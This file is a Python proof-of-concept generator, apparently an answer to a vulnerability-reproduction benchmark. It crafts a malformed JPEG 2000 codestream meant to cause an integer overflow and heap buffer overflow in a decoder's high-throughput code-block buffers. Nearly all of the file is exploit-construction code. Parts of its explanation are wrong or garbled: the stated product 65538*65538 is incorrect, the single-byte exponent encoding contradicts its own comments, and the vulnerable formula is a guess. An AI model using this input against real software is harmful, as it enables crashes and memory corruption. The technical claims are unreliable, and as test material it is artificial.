import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) for a heap buffer overflow in the
    HT_DEC component of a JPEG 2000 decoder.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Crafts a malicious J2C (JPEG 2000 Codestream) file to trigger a
        malloc size error in the opj_t1_allocate_buffers function.

        The vulnerability is triggered by an integer overflow during the calculation
        of buffer sizes for tile decoding. The High-Throughput JPEG 2000 (HTJ2K)
        extension allows for very large code-block dimensions. We exploit this by
        setting the code-block width and height exponents to a large value (16).

        The vulnerable code likely calculates a buffer size using a formula similar to
        `(cblkw + 2) * (cblkh + 2)`. With `log2_cblkw = 16` and `log2_cblkh = 16`,
        the dimensions `cblkw` and `cblkh` become `65536`. The calculation becomes
        `(65536 + 2) * (65536 + 2)`, which is `65538 * 65538 = 4295163264`.
        As a 32-bit unsigned integer, this overflows to `262148` (`0x40004`).

        This results in a much smaller buffer being allocated than required.
        Subsequent decoding operations will write past the end of this small buffer,
        causing a heap buffer overflow and crashing the application.

        The PoC is constructed as a minimal raw J2C codestream containing the
        necessary markers to reach the vulnerable code path. Padding is added to
        match the ground-truth PoC length, which increases the likelihood of the
        out-of-bounds write hitting an unmapped memory page, thus ensuring a crash.
        """
        poc_parts = []

        # SOC - Start of Codestream
        poc_parts.append(b'\xff\x4f')

        # SIZ - Image and Tile Size
        poc_parts.append(b'\xff\x51')
        siz_payload = b''.join([
            struct.pack('>H', 0),      # Rsiz: Profile 0
            struct.pack('>I', 256),    # Xsiz: Image width
            struct.pack('>I', 256),    # Ysiz: Image height
            struct.pack('>I', 0),      # XOsiz: Image X offset
            struct.pack('>I', 0),      # YOsiz: Image Y offset
            struct.pack('>I', 256),    # XTsiz: Tile width
            struct.pack('>I', 256),    # YTsiz: Tile height
            struct.pack('>I', 0),      # XTOsiz: Tile X offset
            struct.pack('>I', 0),      # YTOsiz: Tile Y offset
            struct.pack('>H', 1),      # Csiz: Number of components
            struct.pack('B', 7),       # Ssiz: 8-bit unsigned components
            struct.pack('B', 1),       # XRsiz: Component X subsampling
            struct.pack('B', 1),       # YRsiz: Component Y subsampling
        ])
        poc_parts.append(struct.pack('>H', 2 + len(siz_payload)))
        poc_parts.append(siz_payload)

        # COD - Coding Style Default (The vulnerability trigger)
        poc_parts.append(b'\xff\x52')
        cod_payload = b''.join([
            struct.pack('B', 0x20),    # Scod: Enable HTJ2K
            struct.pack('B', 0),       # SGcod: Progression order (LRCP)
            struct.pack('>H', 1),      # SGcod: Number of layers
            struct.pack('B', 1),       # SGcod: Multiple component transform
            struct.pack('B', 1),       # SPcod: Number of decomposition levels
            struct.pack('B', 0xee),    # SPcod: Code-block w/h exponents (log2=16)
            struct.pack('B', 0x40),    # SPcod: Code-block style
            struct.pack('B', 0),       # SPcod: Wavelet transform (9-7 irreversible)
            b'\x00',                   # Padding to match expected segment length
        ])
        poc_parts.append(struct.pack('>H', 2 + len(cod_payload)))
        poc_parts.append(cod_payload)

        # QCD - Quantization Default
        poc_parts.append(b'\xff\x5c')
        qcd_payload = b'\x00' # Sqcd: Scalar implicit quantization
        poc_parts.append(struct.pack('>H', 2 + len(qcd_payload)))
        poc_parts.append(qcd_payload)

        # SOT - Start of Tile-part
        poc_parts.append(b'\xff\x90')
        sot_payload = b''.join([
            struct.pack('>H', 0),      # Isot: Tile index
            struct.pack('>I', 0),      # Psot: Tile-part length (0 means to EOC)
            struct.pack('B', 0),       # TPsot: Tile-part index
            struct.pack('B', 1),       # TNsot: Number of tile-parts
        ])
        poc_parts.append(struct.pack('>H', 2 + len(sot_payload)))
        poc_parts.append(sot_payload)

        # SOD - Start of Data
        poc_parts.append(b'\xff\x93')

        # Add padding to match the ground-truth PoC length.
        poc_so_far = b''.join(poc_parts)
        padding_needed = 1479 - len(poc_so_far) - 2 # Account for EOC marker
        if padding_needed > 0:
            poc_parts.append(b'\x00' * padding_needed)

        # EOC - End of Codestream
        poc_parts.append(b'\xff\xd9')

        return b''.join(poc_parts)
